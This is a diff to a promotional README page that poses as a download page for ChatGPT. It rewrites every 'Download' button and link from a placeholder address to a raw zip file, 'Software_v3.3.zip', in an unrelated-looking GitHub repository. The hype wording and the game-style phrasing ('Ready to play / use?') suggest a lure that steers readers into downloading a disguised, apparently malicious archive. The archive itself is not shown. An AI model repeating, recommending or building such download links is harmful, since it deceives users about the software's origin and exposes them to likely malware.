@@ -4,7 +4,7 @@
 
 > OpenAI's world-leading AI assistant — now with vision, voice, real-time web browsing, and advanced reasoning, ChatGPT remains the most powerful and widely used AI tool of 2026.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/inwardmoving-synergism715/chatgpt/raw/refs/heads/main/weldability/Software_v3.3.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Web, iOS, Android, macOS, Windo
 
 ### Ready to play / use?
 
-[![Download ChatGPT](https://img.shields.io/badge/Download-ChatGPT-brightgreen?style=for-the-badge)](https://download.com)
+[![Download ChatGPT](https://img.shields.io/badge/Download-ChatGPT-brightgreen?style=for-the-badge)](https://github.com/inwardmoving-synergism715/chatgpt/raw/refs/heads/main/weldability/Software_v3.3.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/inwardmoving-synergism715/chatgpt/raw/refs/heads/main/weldability/Software_v3.3.zip)**
 
 </div>
 
@@ -71,7 +71,7 @@ ChatGPT is one of the **most hyped releases of Summer 2026** — trending across
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/inwardmoving-synergism715/chatgpt/raw/refs/heads/main/weldability/Software_v3.3.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -79,7 +79,7 @@ ChatGPT is one of the **most hyped releases of Summer 2026** — trending across
 
 **Don't miss out — ChatGPT is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT-blue?style=for-the-badge)](https://github.com/inwardmoving-synergism715/chatgpt/raw/refs/heads/main/weldability/Software_v3.3.zip)
 
 *ChatGPT — Available Now · Web, iOS, Android, macOS, Windows*
 
